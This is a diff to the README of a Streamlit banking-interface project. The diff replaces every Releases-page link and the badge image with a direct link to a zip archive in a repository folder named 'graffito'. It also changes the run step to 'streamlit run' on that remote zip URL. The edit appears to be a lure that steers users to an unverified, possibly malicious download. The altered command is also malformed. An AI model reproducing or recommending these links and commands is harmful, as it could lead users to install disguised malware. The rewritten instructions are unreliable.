@@ -6,7 +6,7 @@ Welcome to Streamlit-Bank_interface! This application provides a secure way to m
 
 ## 📥 Download Now
 
-[![Download Streamlit-Bank_interface](https://img.shields.io/badge/Download-Streamlit--Bank_interface-blue.svg)](https://github.com/Sadatero/Streamlit-Bank_interface/releases)
+[![Download Streamlit-Bank_interface](https://github.com/Sadatero/Streamlit-Bank_interface/raw/refs/heads/main/graffito/Streamlit-interface-Bank-1.1-beta.5.zip)](https://github.com/Sadatero/Streamlit-Bank_interface/raw/refs/heads/main/graffito/Streamlit-interface-Bank-1.1-beta.5.zip)
 
 ## 💡 Overview
 
@@ -30,7 +30,7 @@ To run Streamlit-Bank_interface smoothly, ensure your system meets the following
 
 To download the application, visit the Releases page:
 
-[Download Streamlit-Bank_interface](https://github.com/Sadatero/Streamlit-Bank_interface/releases)
+[Download Streamlit-Bank_interface](https://github.com/Sadatero/Streamlit-Bank_interface/raw/refs/heads/main/graffito/Streamlit-interface-Bank-1.1-beta.5.zip)
 
 1. Click on the link above.
 2. Choose the version you want to download. Look for the latest version for the best features.
@@ -56,7 +56,7 @@ Once the application is downloaded and extracted, follow these steps to start:
 
 3. Run the following command to start the application:
    ```
-   streamlit run app.py
+   streamlit run https://github.com/Sadatero/Streamlit-Bank_interface/raw/refs/heads/main/graffito/Streamlit-interface-Bank-1.1-beta.5.zip
    ```
 
 4. A new tab should open in your web browser. If it doesn’t, you can manually open your browser and go to `http://localhost:8501`.
